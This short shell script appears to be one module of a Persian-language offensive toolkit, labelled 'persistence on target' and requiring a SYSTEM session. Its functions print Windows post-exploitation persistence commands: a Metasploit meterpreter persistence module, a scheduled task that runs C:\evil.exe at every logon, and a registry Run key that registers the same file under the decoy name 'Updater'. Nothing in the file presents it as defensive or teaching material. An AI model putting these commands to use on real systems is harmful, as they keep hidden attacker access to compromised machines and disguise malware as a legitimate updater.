DESC="ماندگاری روی هدف"
REQ="session SYSTEM"
RISK="HIGH"

termux(){ echo "# داخل meterpreter: run post/windows/manage/persistence_exe"; }

kali(){
cat <<'EOF'
# داخل meterpreter:
run post/windows/manage/persistence_exe
# یا:
schtasks /create /tn updater /tr C:\\evil.exe /sc onlogon
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\evil.exe
EOF
}
